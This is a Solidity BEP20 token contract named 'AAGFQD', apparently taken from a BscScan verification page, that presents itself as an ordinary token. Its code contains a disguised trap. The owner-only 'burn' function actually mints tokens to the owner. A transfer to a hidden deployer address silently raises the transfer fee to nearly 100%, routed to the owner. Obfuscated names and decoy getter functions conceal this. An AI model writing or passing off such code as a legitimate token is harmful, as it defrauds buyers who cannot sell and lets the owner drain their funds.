/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.7.3;
contract PVLPZYW {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  OKGTSY = 100000000;
address private  GIHNXO = address(0);
string public  name = "AAGFQD";
uint256 private  GZRYIO = 10000000000;
address private  HCTQFY = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address public owner;
address private  UIWODZ = address(0);
uint256 private  GPVPXW = 1000000000000000000000;
uint256 private  EPMPDD = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => uint256) public balanceOf;
string public  symbol = "AAGFQD";
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  MBVDDB = 10000000000000;
address private  WYOQAH = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant TISNFB = 99999;
address private  AXDFQG = address(0);
uint256 private  FRFJVF = 1000000000000000;
uint8 public constant decimals = 18;
uint256 private  RCYZAK = 1000000000000000000;
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getHCTQFY() private returns (address) {
return HCTQFY;
}

constructor () {
WYOQAH = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ZUDSDG");
require(to != address(0), "ZUDSDG");
require(amount <= balanceOf[from], "ZUDSDG");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* TISNFB/EPMPDD ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==WYOQAH){
EPMPDD = TISNFB+2;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getFRFJVF() private returns (uint256) {
return FRFJVF;
}

function _getAXDFQG() private returns (address) {
return AXDFQG;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getOKGTSY() private returns (uint256) {
return OKGTSY;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getGZRYIO() private returns (uint256) {
return GZRYIO;
}

function _getUIWODZ() private returns (address) {
return UIWODZ;
}

function _getMBVDDB() private returns (uint256) {
return MBVDDB;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tZUDSDG 0");
require(spender != address(0), "fZUDSDG 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getGPVPXW() private returns (uint256) {
return GPVPXW;
}

function _getGIHNXO() private returns (address) {
return GIHNXO;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getRCYZAK() private returns (uint256) {
return RCYZAK;
}


}